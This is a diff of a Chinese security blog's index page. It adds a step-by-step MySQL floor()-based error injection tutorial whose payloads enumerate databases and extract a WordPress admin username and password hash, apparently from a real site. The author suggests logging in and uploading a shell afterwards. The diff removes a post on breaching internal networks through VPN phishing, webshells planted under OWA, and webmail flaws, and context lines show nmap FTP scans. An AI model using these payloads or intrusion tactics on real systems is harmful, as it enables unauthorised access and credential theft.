@@ -139,6 +139,76 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/05/13/mysql-error-injection/">
+                sql注入入门 之 mysql 显错注入 [ floor()显错 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,实例显错型 mysql 注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error1.png" alt="&#39;&#39;"><br></p>
+<p>2,尝试单引号后,目标如期报错,很好,我们要的正是这个报错信息,因为后面的查询全都要靠它,另外,从报错信息来看,我们知道目标是linux的机器,网站的物理路径也顺便送给了我们,如果root的注入点,我们岂不是,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error2.png" alt="&#39;&#39;"><br></p>
+<p>3,同样,虽然这里打眼一看可能又会以为是个数字型注入,但其实后端依然是把它当做字符串来接收的,所以,就需要我们把前后的单引号都闭合掉<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">'and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error2_1.png" alt="&#39;&#39;"><br></p>
+<p>4,成功闭合后,就可以继续正常查询各种数据,还是习惯性的先搜集下目标数据库的相关信息<br>获取当前数据库版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error3.png" alt="&#39;&#39;"><br></p>
+<p>获取当前数据库用户权限<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error4.png" alt="&#39;&#39;"><br></p>
+<p>查看当前数据库名,可知当前数据库名为 ‘jamesbaird_pcba’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error5.png" alt="&#39;&#39;"><br></p>
+<p>查看目标的机器名,可能有时候我们希望根据目标的机器名来大致判断当前机器是干啥的,以此来确定其价值的高低……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@hostname,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error6.png" alt="&#39;&#39;"><br></p>
+<p>查看目标mysql的安装路径,创建自定义函数时可能会用到<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (select concat(0x7e,@@basedir,0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error7.png" alt="&#39;&#39;"><br></p>
+<p>5,搜集完相关信息以后,我们开始查询真正的数据,首先,列出所有的数据库名(依然是你有权限看的’所有’),同样是利用limit<br>获取第一个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error8.png" alt="&#39;&#39;"><br></p>
+<p>获取第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error9.png" alt="&#39;&#39;"><br></p>
+<p>获取第三个数据库名,从前面我们已经知道,这个是我们当前所在的库<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error10.png" alt="&#39;&#39;"><br></p>
+<p>获取第四个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 3,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error11.png" alt="&#39;&#39;"><br></p>
+<p>6,有了所有的数据库名以后,我们就可以开始查表名了,首先,查出当前库中的所有表名,当然,我们的最终目的还是为了找到目标网站的管理表,不一定非要把所有的表名都查出来,找到管理表,只要拿到账号密码即可</p>
+<p>从当前库中获取第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error12.png" alt="&#39;&#39;"><br></p>
+<p>接着依次获取第二张表名,第三张表名,……其实,中间还查出来很多表,但并不是我想要的,所以中间的过程我就都省略了,不过,最终也还是没能找到我们想要的那张管理表,没办法,只能跨库查了,当然,跨库肯定是有前提的,你只能跨到你有权限跨进的库中,废话不多讲,我们继续查<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error13.png" alt="&#39;&#39;"><br></p>
+<p>直到当我查到’jamesbaird<em>current’这个库时,一眼就发现了’wp</em>‘ 前缀,有经验的一眼就看出来了,这是个wordpress程序的数据库,既是开源程序,库表结构自然就非常清晰了(一般情况下很少人会改它原来的库表结构,因为那样可能意味着要大篇幅重构代码,如果不是做深度二次开发,最多可能只会在原有的库表基础上加表加功能),下面的十六进制数据表示的是’jamesbaird_current’库名,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=0x6a616d657362616972645f63757272656e74 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error14.png" alt="&#39;&#39;"><br></p>
+<p>7,按说,我们现在就可以直接去查出管理员的账号密码,因为wordpress默认的管理表名和该表中的字段名我们早已了如指掌,为了文章完整性,这里还是一步步的来吧<br>获取第二个字段名,用户名字段,下面的十六进制数据表示的是’wp_users’的表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error15.png" alt="&#39;&#39;"><br></p>
+<p>获取第三个字段名,密码字段<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x77705f7573657273 LIMIT 2,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error16.png" alt="&#39;&#39;"><br></p>
+<p>8,现在,直接从wp_users表中获取管理员的账号和密码hash即可,至此,一次基本的mysql显错注入就算完成了,虽然我们现在查到的账号密码可能并不是这个网站的后台管理账号密码,但起码我们知道它肯定有一个wordpress程序存在,找到那个wordpress所在的地址,然后登进去,传shell也是一样的,可那并不是今天的重点,这里我也不啰嗦了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.vuln.com/profile</span>_view.php?id=<span class="number">13</span><span class="string">' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_login,0x3a,user_pass,0x23) FROM jamesbaird_current.wp_users limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and  '</span>s<span class="string">'='</span>s</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mysql_error17.png" alt="&#39;&#39;"><br></p>
+<p>9,最终,我们得到的管理员的账号密码如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">admin:</span><span class="number">5</span>ce14b22a4406974b33dfcaa****** (md5的hash,相必这个wordpress版本必然很低)</div></pre></td></tr></table></figure></p>
+<p><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;这里也只是简单演示了在显错注入中最常用的一种,基于floor()函数的,关于另外两个函数的利用和这个方式都基本一致,语句稍微变下即可,这里就不再重复啰嗦了,另外,今天的重点只是想让大家明白怎么通过显错进行注入,注入语句可能一眼看上去比较难懂,但从里往外一句句拆出来执行就知道什么意思了,其实不难,关键是自己一定要有耐心<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/05/11/mysql-common-injection/">
                 sql注入入门 之 mysql 常规注入 [ union方式 ]
             </a>
@@ -768,57 +838,6 @@
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tail -f 21.txt</span></div><div class="line"><span class="comment"># awk &#123;'print $6'&#125; 21.txt &gt;&gt; result.txt</span></div><div class="line"><span class="comment"># nmap -p 21 -iL result.txt  -oN ftp_anonymous.txt  -v --script ftp-anon.nse</span></div></pre></td></tr></table></figure>
 <p><br></p>
 <p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于端口渗透,如果不是你自己写工具的情况下,其实本身并没多少技术含量,工具总体使用上还是比较简单的[对于无状态扫描的具体内部实现还是比较复杂的,至今为止,我自己也有很多东西都没整明白],这个东西怎么说呢,很多是运气和经验的成分在里面,可能还要外加一个高质量的字典,另外,再多说一句,在没有十足的把握的情况下,直接在公网爆破是不太靠谱的,实际测试中,对一些稍有防护的目标,爆破的成率还是蛮低的[虽然低,但往往非常有效,走投无路不妨尝试],当然啦,对于端口,爆破只是一个很小的方面,比如,当我们发现某个工具或者系统服务存在远程溢出或者代码执行[肯定不仅限于此类的可远程利用的漏洞],就可以通过这种方式大规模的批量实施端口入侵,这也许才是它真正的价值所在,可能还有很多其它的小工具,脚本这里都没提到,不过那些都不太重要,对于公网扫描,有这些,足矣,至于那些,后期到内网中我们再具体说不迟,祝大家好运!<br><br></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2014/12/18/inside-method/">
-                web渗透第一步之信息搜集  [ 找目标内网入口 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2014-12-18</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/dirscan-tools/">dirscan tools</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 为什么要找内网入口:<br>&nbsp;&nbsp;&nbsp;&nbsp;我们渗透的最终目的大多数都是目标内网,有些核心敏感数据(比如,个人机上的一些数据),我们从边界机器是拿不到的,所以,只能深入内部,当然,这里所指的内部文件数据,并不仅限于数据库,邮件这类数据,可能由于各种各样的需求,我们还需要某些个人的数据或者组织的各种业务数据,技术的各种数据等等,一般情况下,渗透web的目的,很大程度上也是希望能从web边界直接进入到目标内部(内网),对于apt来讲,价值比较高的东西基本也全部在内部,不得不承认的是,有时候公开信息调研确实也能找到部分敏感信息,但那个含金量和时效性就远远不如内网中的了,至于如何深入到目标内部,很大程度上也取决于,我们能不能尽可能多的找到目标可能的内网入口</p>
-<p>0x02 第一种,通过vpn进入目标内网[一般都会提供一个web端的443端口表单验证]:<br>&nbsp;&nbsp;&nbsp;&nbsp;vpn,想必大家都已经非常熟悉了,在前面也已经详细说明过它的用途,除了能帮我们翻墙当跳板之外,对于一些大型目标组织或是跨国公司,他们大部分都会选择利用vpn的方式来协作办公,通过vpn在公网上开辟一条专有通道,以方便公司内部的各种业务处理,但有个前提,你要想进入这条通道,必须有正确的vpn账号密码和vpn服务器地址,登陆成功后,才能处在目标的内网中,重点也就在这里,怎么搞到目标的vpn账号密码呢,嘿嘿……方法比较多,例如,发信钓鱼,搜集目标泄露过的各种配置文件,社工撞库……</p>
-<p>0x03 利用各类邮件程序自身的漏洞尝试从web边界进入目标内网<br>&nbsp;&nbsp;&nbsp;&nbsp;下面就简单介绍一种常见的web邮件程序,[这里为什么一定要是邮件程序呢,不同于普通的web网站,普通的web服务器有时候即使拿到shell,但有可能机器并不在内网或者该机器上根本没有内网网卡,但邮件服务器一般都被会用来处理内部实际业务,从个人经验来看,web邮件程序的机器,绝大部分都在内网]:</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;owa 微软自家的exchange服务,企业为了便于统一协作管理,一般都会直接把exchange服务部署在域内,邮箱名称和邮箱密码大部分也直接是域内的系统账号密码,可以直接拿来登陆域内系统,当然,vpn也是可以尝试的,关键还是看目标具体是怎么部署的了,至于,如何搞到目标的owa的账号密码,嘿嘿……后面再总结吧,包括命令行邮件导出成pst文件,如果目标部署的有exchange server 一般直接访问下/owa/auth即可看到,服务被部署好以后管理员没有特殊情况基本就不怎么会关注/owa/auth目录下的文件了,所以当你拿到权限后,在这儿放个webshell,还是很靠谱的,一般都是web的443端口,另外,对于owa本身几乎是没什么漏洞的</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">owa的一般入口如下:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/remote.bmtjfa.com.au/owa</span><span class="regexp">/auth/logon</span>.aspx机器在域内的情况</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.advancedptsm.com/owa</span><span class="regexp">/auth/logon</span>.aspx机器不在域内的情况</div><div class="line"></div><div class="line">如果没有删的话,可以访问下面的路径爆出服务器信息:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.xxx.com/owa</span><span class="regexp">/auth/test</span>.aspx</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Mirapoint邮件系统:</div><div class="line">ShellShock漏洞,漏洞地址如下:</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/xxxx.com/cgi</span>-bin/search.cgi</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/xxxx.com/cgi</span>-bin/madmin.cgi</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">KerioConnect 邮件系统:</div><div class="line">一般后台只能内网访问,入口如下:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/mail.xxx.com:4040/admin</span><span class="regexp">/login/</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Zimbra 邮件系统: </div><div class="line">本地包含,入口:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/webmail.xxx.com:7071/zimbra</span>Admin/</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">查看zimbra版本:</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/webmail.xxx.com/help</span><span class="regexp">/zh_CN/standard</span><span class="regexp">/version.htm</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Atmail 邮件系统: </div><div class="line">敏感信息泄露问题[数据库账号密码]:</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.xxx.com/config</span><span class="regexp">/dbconfig.ini</span></div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Lotus Domino <span class="symbol">Webmail:</span></div><div class="line">越权访问,<span class="symbol">inurl:</span>.nsf/WebHelp/!OpenPage</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">TurboMail邮件系统: </div><div class="line">默认配置不当可进入任意邮箱,默认有四个root域账号,一个管理员,三个普通用户</div><div class="line">由于设置缺陷,导致普通用户可以查看任意用户的密码</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">U-<span class="symbol">mail:</span></div><div class="line">sql注入,可写shell</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">WinMail:</span></div><div class="line">非授权访问/权限绕过</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ExtMail :</div><div class="line">老版本注入</div></pre></td></tr></table></figure>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SquirrelMail</div></pre></td></tr></table></figure>
-<p>0x04 找目标的oa系统或者图书馆之类的网站以及各种边界网络设备的web管理端[一般像这些东西跟内网的联系比较大]:<br>&nbsp;&nbsp;&nbsp;&nbsp;oa本来就是为了方便员工远程办公,处理公司各种业务用的,但,这也给我们提供了通往目标内部的入口至于,为什么非要选则图书馆,目的很显然,既然是图书馆,你肯定会想到内部的什么图书管理系统,实际经验也证明,大多数图书馆的站,都会处在内网中找各种网络设备的web管理端,主要是想登进去以后,看看有没有可以上传shell的地方,也许可以利用得到</p>
-<p>0x05 在你能力足够的情况下,直接搞路由也是可以的[比如,cisco,端口镜像,抓包分析,说实话自己对路由并不是非常擅长]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">路由作为一种边界设备,搞它的意义就不用再多说了吧</div></pre></td></tr></table></figure></p>
-<p>0x06 暴露在边界的目标打印机,智能点儿的打印机都会自带一些web服务[通常是java]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">打印机,就更不用说了,典型的内部设备,一般是先找到配置管理界面,部署war包</div></pre></td></tr></table></figure></p>
-<p>0x07 如果实在外部搞不定,条件允许的情况下,尝试实地渗透也是可以的,比如,通过无线进入目标内部<br>&nbsp;&nbsp;&nbsp;&nbsp;这也算是一种相对比较高效的渗透方式,老外非常干这个,但前提是,你可能需要很多次的蹲点,才能确认目标,实地渗透对你的心里素质要求可能会更高一些,另外,现场的环境和有限的时间也多多少少会影响到你<br><br></p>
-<p>一些小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;时间原因,暂时就想到这些,都是一些平时的经验加上一点自己的想法,其实,就整个信息搜集来讲,对你的社工能力其实是个不小的考验,我自己在这方面确实是弱项,后续会慢慢加强<br><br></p>
 
         </div>
     
